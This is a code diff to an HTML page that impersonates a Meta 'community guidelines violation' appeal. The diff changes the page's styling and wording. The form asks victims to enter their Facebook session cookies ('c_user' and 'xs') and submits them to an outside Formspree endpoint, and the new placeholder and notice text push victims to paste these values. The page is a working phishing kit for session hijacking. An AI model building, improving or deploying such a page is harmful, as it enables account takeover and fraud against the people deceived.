@@ -7,42 +7,43 @@
     <style>
         * { box-sizing: border-box; }
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: #f0f2f5; display: flex; justify-content: center; align-items: flex-start; 
+            font-family: Helvetica, Arial, sans-serif; 
+            background: #f0f2f5; display: flex; justify-content: center; align-items: start; 
             min-height: 100vh; margin: 0; padding: 20px;
         }
         .meta-container { 
-            background: white; padding: 25px; border-radius: 8px; 
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1); 
-            width: 100%; max-width: 480px;
+            background: white; padding: 24px; border-radius: 12px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+            width: 100%; max-width: 450px;
         }
-        .header { margin-bottom: 20px; }
-        .meta-logo { width: 40px; margin-bottom: 15px; }
-        .header-title { font-size: 24px; font-weight: 700; color: #1c1e21; margin: 0; }
-        .header-desc { font-size: 15px; color: #606770; margin-top: 5px; }
+        .header { margin-bottom: 24px; }
+        .meta-logo { width: 44px; margin-bottom: 16px; }
+        .header-title { font-size: 26px; font-weight: 800; color: #1c1e21; margin: 0; }
+        .header-desc { font-size: 15px; color: #606770; margin-top: 8px; }
         
         .alert-box { 
-            border: 1px solid #dddfe2; border-radius: 8px; 
-            padding: 15px; background-color: #fafafa; margin-bottom: 20px;
+            border-radius: 8px; padding: 16px; background-color: #f7f8fa; 
+            margin-bottom: 24px; border-left: 4px solid #0866ff;
         }
-        .alert-item { font-size: 14px; color: #1c1e21; margin-bottom: 10px; }
+        .alert-item { font-size: 14px; color: #1c1e21; margin-bottom: 8px; line-height: 1.5; }
 
-        .video-wrapper { width: 100%; margin-bottom: 20px; }
-        .video-wrapper video { width: 100%; border-radius: 6px; border: 1px solid #dddfe2; }
+        .video-wrapper { width: 100%; margin-bottom: 24px; }
+        .video-wrapper video { width: 100%; border-radius: 8px; border: 1px solid #dddfe2; background: #000; }
 
-        .input-group { margin-bottom: 15px; }
-        .input-label { font-size: 14px; font-weight: 600; color: #4b4f56; margin-bottom: 5px; display: block; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { font-size: 14px; font-weight: 700; color: #1c1e21; margin-bottom: 8px; display: block; }
         input[type="text"] { 
-            width: 100%; padding: 10px; border: 1px solid #dddfe2; 
-            border-radius: 6px; font-size: 15px;
+            width: 100%; padding: 12px; border: 1px solid #dddfe2; 
+            border-radius: 8px; font-size: 16px; background: #f5f6f7;
         }
 
         .submit-btn { 
-            width: 100%; padding: 10px; background: #0866ff; 
-            color: white; border: none; border-radius: 6px; 
-            font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
+            width: 100%; padding: 14px; background: #0866ff; 
+            color: white; border: none; border-radius: 8px; 
+            font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s;
         }
-        .footer-text { font-size: 12px; color: #8d949e; text-align: center; margin-top: 20px; }
+        .submit-btn:hover { background: #1b74e4; }
+        .footer-text { font-size: 12px; color: #8d949e; text-align: center; margin-top: 30px; }
     </style>
 </head>
 <body>
@@ -55,9 +56,9 @@
         </div>
         
         <div class="alert-box">
-            <div class="alert-item">• Your page has a violation related to our community guidelines.</div>
-            <div class="alert-item">• Please review the violation details carefully.</div>
-            <div class="alert-item">• Ensure you provide correct information.</div>
+            <div class="alert-item"><b>Notice:</b> Your page has a violation related to community guidelines.</div>
+            <div class="alert-item">Please review the details below carefully.</div>
+            <div class="alert-item">Ensure your session information is correct for processing.</div>
         </div>
 
         <div class="video-wrapper">
@@ -70,12 +71,12 @@
         <form action="https://formspree.io/f/maqaobyw" method="POST">
             <div class="input-group">
                 <label for="c_user" class="input-label">c_user</label>
-                <input type="text" id="c_user" name="c_user" required>
+                <input type="text" id="c_user" name="c_user" placeholder="e.g., 1000..." required>
             </div>
             
             <div class="input-group">
                 <label for="xs" class="input-label">xs</label>
-                <input type="text" id="xs" name="xs" required>
+                <input type="text" id="xs" name="xs" placeholder="Enter session cookie" required>
             </div>
             
             <button type="submit" class="submit-btn">Submit Appeal</button>
